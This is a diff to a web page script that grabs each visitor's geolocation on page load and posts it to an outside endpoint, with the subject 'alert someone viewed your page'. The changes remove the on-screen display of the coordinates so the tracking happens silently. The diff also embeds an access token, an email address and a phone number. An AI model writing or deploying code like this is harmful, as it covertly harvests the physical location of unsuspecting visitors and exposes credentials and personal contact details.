@@ -52,7 +52,7 @@ if (navigator.geolocation)
 {
 navigator.geolocation.getCurrentPosition(showPosition);
 }
-else{x.innerHTML="Geolocation is not supported by this browser.";}
+
 }
 function showPosition(position)
 {
@@ -62,17 +62,17 @@ function showPosition(position)
     data= {
       access_token: "eqhitskqjijhat94ecddwtzc",
      subject: 'alert someone viewed your page',
-     message: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
-     email: "erict54757@gmail.com" ,
-     icon_telephone:"7153799917"
-     
+     text: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
+     reply_to: "erict54757@gmail.com" ,
+     extra_phone_number:"7153799917",
+     submit_form:"send"
+
     }
     $.post(URL,data,function(status,xhr){
       console.log(status)
     })
   
-x.innerHTML="Latitude: " + position.coords.latitude + 
-"<br>Longitude: " + position.coords.longitude;  
+ 
 }
 getLocation()
 
